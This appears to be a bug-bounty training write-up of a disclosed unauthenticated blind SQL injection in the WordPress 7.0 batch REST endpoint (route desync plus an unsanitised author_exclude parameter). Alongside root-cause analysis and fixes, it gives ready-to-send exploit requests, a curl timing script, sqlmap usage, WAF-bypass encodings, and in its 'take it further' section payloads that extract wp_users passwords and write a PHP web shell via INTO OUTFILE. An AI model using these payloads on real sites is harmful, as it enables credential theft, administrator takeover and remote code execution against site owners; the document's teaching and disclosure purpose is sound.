# SQL Injection - Unauthenticated Blind SQLi via WordPress Batch Route Confusion (Original: Essity #3873072 - Critical 9.3)

> Original: https://hackerone.com/reports/3873072 | Reporter: matty69v | Disclosed: 2026-07-21 | Severity: Critical 9.3 | Asset: https://dedicatoame.it/ `/wp-json/batch/v1` WP 7.0

## 1. TL;DR for Hunters
WordPress batch endpoint lets you send many sub-requests in 1 POST. If sub-path is `:` (invalid), `parse_url()` fails, `$matches` not pushed but loop index still `++`. So request N runs with handler N+1 (desync). By nesting batch inside `POST /wp/v2/categories` body, attacker shifts `GET /wp/v2/categories?author_exclude=<PAYLOAD>` to run as posts query. `WP_Query` checks `if (!empty(author__not_in))` but not `is_array`, so string skips `absint()` and goes raw into `AND post_author NOT IN (<you>)`. `1) OR SLEEP(0.01)-- -` → 0.5s vs 9.1s proves SQL exec. No login. Read wp_users → admin takeover, possible RCE via INTO OUTFILE.

## 2. Attack Surface & Context
- WP 7.0 `POST /wp-json/batch/v1` + `/?rest_route=/batch/v1` unauthenticated by default.
- Fingerprint: `GET /feed/` → `<generator>https://wordpress.org/?v=7.0</generator>`
- Hunt same: any `/wp-json/batch/v1`, `/wp-json/`, plugins with batch, `author_exclude`, `author__not_in`, `include`, `exclude` params that become `IN (...)`.

## 3. Concepts Explained Simply (word-by-word)

Payload A - outer wrapper:
```json
{"validation":"normal","requests":[
  {"path":":","method":"POST"},
  {"path":"/wp/v2/categories","method":"POST","body":{"name":"x","requests":[...]}},
  {"path":"/batch/v1","method":"POST"}
]}
```
- `validation` = dummy, ignored.
- `requests` = array of sub-requests batch will run one by one.
- `{"path":":","method":"POST"}` = invalid path `:` → `parse_url(":")` fails → triggers desync (index moves but matches not). This is the shifter.
- Second entry = real categories create, but `body` contains inner `requests` = nested batch. Server re-dispatches inner list with shifted handlers.
- Third = closer to keep envelope 207.

Inner:
```json
{"path":":","method":"GET"},
{"path":"/wp/v2/categories?author_exclude=1","method":"GET"},
{"path":"/wp/v2/posts","method":"GET"}
```
- First `:` again shifts inner dispatch.
- Second = injection point. `author_exclude=1` → becomes `author__not_in=1` → SQL `NOT IN (1)`.
- Third = victim handler that actually runs query.

Payload B - timing proof:
```
1) OR SLEEP(0.01)-- -
```
- `1)` = close `NOT IN (1` + close bracket.
- `OR SLEEP(0.01)` = if true, sleep 0.01s per row. 860 rows × 0.01 = ~9s. Proves code runs in MySQL.
- `-- -` = comment out rest of SQL (space after -- required in MySQL). Prevents syntax error.
- Baseline `1` = 0.46s, `SLEEP(0)` = 0.49s, `SLEEP(0.01)` = 9.12s. Same structure, only delay differs → proof.

## 4. Step-by-Step Reproduction (with examples)
Step 1 fingerprint:
```http
GET /feed/ HTTP/1.1
Host: target
# look: <generator>https://wordpress.org/?v=7.0</generator>
```
Step 2 structural (benign `1`, no sleep):
```http
POST /wp-json/batch/v1 HTTP/1.1
Host: target
Content-Type: application/json

{"validation":"normal","requests":[{"path":":","method":"POST"},{"path":"/wp/v2/categories","method":"POST","body":{"name":"x","requests":[{"path":":","method":"GET"},{"path":"/wp/v2/categories?author_exclude=1","method":"GET"},{"path":"/wp/v2/posts","method":"GET"}]}},{"path":"/batch/v1","method":"POST"}]}
```
Expect `207` with nested `responses` + `parse_path_failed` + inner `10 posts returned`. Patched = flat, `rest_cannot_create`.
Step 3 timing: replace `author_exclude=1` with `author_exclude=1)%20OR%20SLEEP(0)--%20-%20` then `SLEEP(0.01)`. Measure time. 0.5s → 9s = vulnerable.
`instructor-added example` for lab: try `author_exclude=1) OR (SELECT 1 FROM (SELECT SLEEP(0))a)-- -` if WAF blocks spaces, use `/**/` .

## 5. Root Cause Analysis
```php
// 1. batch dispatch (pseudo)
foreach ($requests as $i=>$r){
  $m = parse_url($r['path']); // ":" => false
  if($m) $matches[]=$m; // not pushed on fail
  dispatch($handlers[$i]); // still uses $i, so shifted!
}
// 2. WP_Query
if(!empty($q['author__not_in'])){ // string "1) OR..." not empty = true
  // missing: if(!is_array) reject
  $ids = is_array($v) ? array_map('absint',$v) : $v; // string bypasses absint!
  $sql .= "AND post_author NOT IN ($ids)"; // raw!
}
```
Fix: push placeholder on parse fail OR use handler mapped to match, not index. Add `is_array` guard + `(int)` cast. Update WP 7.0.2+/6.9.5+/6.8.6+.

## 6. Why It Slipped Past Devs
- Batch seen as convenience, not security boundary. Thought sub-requests re-use same auth/validation.
- Assumed `author_exclude` always array from internal code, forgot URL query string gives string.
- `empty()` ≠ type check. Classic PHP loose typing.
- No test for `:` path + nested batch combo.

## 7. Advanced Completions - How to Take It Further
1. Extract data blind: `1) OR IF(SUBSTRING((SELECT password FROM wp_users LIMIT 1),1,1)='a',SLEEP(0.02),0)-- -` loop char by char (use sqlmap `--technique=T --time-sec`).
2. Error-based if verbose: `1) AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM wp_users GROUP BY x)a)-- -`
3. Order/table enum: `wp_users`, `wp_usermeta` (session_tokens), `wp_options` (API keys).
4. RCE if FILE priv: `1) UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -`
5. WAF bypass: `SLEEP/**/(0.01)`, `OR/**/SLEEP`, URL double-encode `%2520`, `+` vs `%20`.
6. Other params same sink: `author`, `include`, `exclude`, `parent__in`, `tag__not_in` — fuzz all `*_exclude`, `*_include`.
7. Rest_route variant: `POST /?rest_route=/batch/v1` when `/wp-json/` blocked by WAF.
8. Authenticated variant: same desync may hit other handlers requiring nonce — test with low-priv subscriber token.

## 8. Hunting Methodology Checklist
- [ ] `GET /feed/` version, `GET /wp-json/` listing batch enabled?
- [ ] `POST /wp-json/batch/v1` unauth 207 or 401? If 401, try `/?rest_route=/batch/v1`.
- [ ] Send structural benign payload above, look for nested `responses` + `parse_path_failed`.
- [ ] Only then timing: `SLEEP(0)` vs `SLEEP(0.01)`, repeat 2x (network jitter).
- [ ] Non-destructive only: no dump, report timing diff + version.

## 9. Automation
```bash
# time diff
time curl -s -X POST https://target/wp-json/batch/v1 -H 'Content-Type: application/json' -d '{"validation":"normal","requests":[{"path":":","method":"POST"},{"path":"/wp/v2/categories","method":"POST","body":{"name":"x","requests":[{"path":":","method":"GET"},{"path":"/wp/v2/categories?author_exclude=1) OR SLEEP(0)-- -","method":"GET"},{"path":"/wp/v2/posts","method":"GET"}]}},{"path":"/batch/v1","method":"POST"}]}' -o /dev/null
# sqlmap (blind, time): sqlmap -u "https://target/wp-json/batch/v1" --data='...' --technique=T --time-sec=2 --dbms=mysql
```

## 10. Mitigation & Fix Review
Update WP, block unauth batch at proxy/WAF, revoke MySQL FILE, least-priv DB user. Verify: nested batch → flat `rest_cannot_create`, `author_exclude=string` → 400, `SLEEP` no delay.

## 11. Practice Lab
- Docker WP 7.0, enable REST, replay Step 2 locally, observe 207 nested.
- PortSwigger SQLi labs (blind time-based), then WP-specific.
- Local PHP: `if(!empty("1) OR..."))` true demo + `absint` bypass.

## 12. Key Takeaway for Daily Hunting
Today: `GET /feed/` → if WP, immediately try batch desync benign payload. `*_exclude` + `NOT IN (` = classic string-vs-array SQLi. Timing 0.5s→9s is your $ proof.
